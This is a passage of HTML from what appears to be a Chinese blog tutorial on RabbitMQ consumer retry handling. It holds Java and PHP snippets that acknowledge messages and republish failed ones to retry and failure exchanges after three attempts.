id=\"crayon-5b623eb2c51e8913938516-2\"><span class=\"crayon-e\">Consumer </span><span class=\"crayon-v\">consumer</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">DefaultConsumer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e8913938516-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Override</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e8913938516-4\"><span class=\"crayon-e\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">handleDelivery</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">consumerTag</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Envelope </span><span class=\"crayon-v\">envelope</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e8913938516-5\"><span class=\"crayon-h\">                               </span><span class=\"crayon-v\">AMQP</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">BasicProperties </span><span class=\"crayon-v\">properties</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">byte</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">body</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">throws</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">IOException</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e8913938516-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e8913938516-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 注意，由于使用了basicConsume的autoAck特性，因此这里就不需要手动执行</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e8913938516-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// channel.basicAck(envelope.getDeliveryTag(), false);</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e8913938516-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e8913938516-10\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e8913938516-11\"><span class=\"crayon-c\">// 执行消息消费处理</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e8913938516-12\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">basicConsume</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e8913938516-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e8913938516-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// autoAck</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e8913938516-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">consumer</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e8913938516-16\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51eb317320436\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$this-&gt;channel-&gt;basic_consume(\r\n    $queueName,\r\n    '',    // customer_tag\r\n    false, // no_local\r\n    false, // no_ack\r\n    false, // exclusive\r\n    false, // nowait\r\n    function (AMQPMessage $msg) use ($queueName, $routingKey, $callback) {\r\n        ...\r\n        $msg-&gt;delivery_info['channel']-&gt;basic_ack($msg-&gt;delivery_info['delivery_tag']);\r\n    }\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51eb317320436-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51eb317320436-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51eb317320436-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51eb317320436-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51eb317320436-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51eb317320436-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51eb317320436-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51eb317320436-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51eb317320436-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51eb317320436-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51eb317320436-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51eb317320436-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51eb317320436-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">basic_consume</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51eb317320436-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51eb317320436-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">''</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// customer_tag</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51eb317320436-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// no_local</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51eb317320436-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// no_ack</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51eb317320436-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// exclusive</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51eb317320436-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// nowait</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51eb317320436-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">AMQPMessage</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">use</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">queueName</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">callback</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51eb317320436-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51eb317320436-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">delivery_info</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'channel'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">basic_ack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">delivery_info</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'delivery_tag'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51eb317320436-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51eb317320436-12\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>如果消息处理中出现异常，应该将该消息重新投递到重试Exchange，等待下次重试</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51ee897382674\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbasic_publish(msg, 'master.retry', routing-key)\r\nack(delivery-tag) // 不要忘记了应答消费成功消息</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51ee897382674-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51ee897382674-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51ee897382674-1\"><span class=\"crayon-e\">basic_publish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master.retry'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routing</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51ee897382674-2\"><span class=\"crayon-e\">ack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">delivery</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tag</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 不要忘记了应答消费成功消息</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>如果判断重试次数大于3次，仍然处理失败，则应该讲消息投递到失败Exchange，等待人工处理</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51f2546717183\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbasic_publish(msg, 'master.failed', routing-key)\r\nack(delivery-tag) // 不要忘记了应答消费成功消息</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f2546717183-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51f2546717183-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f2546717183-1\"><span class=\"crayon-e\">basic_publish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master.failed'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routing</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51f2546717183-2\"><span class=\"crayon-e\">ack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">delivery</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tag</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 不要忘记了应答消费成功消息</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<blockquote><p>一定不要忘记ack消息，因为重试、失败都是通过将消息重新投递到重试、失败Exchange来实现的，如果忘记ack，则该消息在超时或者连接断开后，会重新被重新投递给消费者，如果消费者依旧无法处理，则会造成死循环。</p></blockquote>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51f5223918138\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntry {\r\n    String message = new String(body, \"UTF-8\");\r\n    // 消息处理函数\r\n    handler.handle(message, envelope.getRoutingKey());\r\n\r\n} catch (Exception e) {\r\n    long retryCount = getRetryCount(properties);\r\n    if (retryCount &gt; 3) {\r\n        // 重试次数大于3次，则自动加入到失败队列\r\n        channel.basicPublish(\"master.failed\", envelope.getRoutingKey(), MessageProperties.PERSISTENT_BASIC, body);\r\n    } else {\r\n        // 重试次数小于3，则加入到重试队列，30s后再重试\r\n        channel.basicPublish(\"master.retry\", envelope.getRoutingKey(), properties, body);\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f5223918138-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51f5223918138-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f5223918138-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51f5223918138-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f5223918138-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51f5223918138-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f5223918138-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51f5223918138-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f5223918138-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51f5223918138-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f5223918138-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51f5223918138-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f5223918138-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51f5223918138-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f5223918138-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f5223918138-1\"><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51f5223918138-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">message</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">body</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"UTF-8\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f5223918138-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 消息处理函数</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51f5223918138-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">handler</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">handle</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">message</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">envelope</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getRoutingKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f5223918138-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51f5223918138-6\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">Exception</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f5223918138-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">retryCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getRetryCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">properties</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51f5223918138-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">retryCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f5223918138-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 重试次数大于3次，则自动加入到失败队列</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51f5223918138-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">basicPublish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"master.failed\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">envelope</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getRoutingKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MessageProperties</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">PERSISTENT_BASIC</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">body</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f5223918138-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51f5223918138-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 重试次数小于3，则加入到重试队列，30s后再重试</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f5223918138-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">basicPublish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"master.retry\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">envelope</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getRoutingKey</span><span 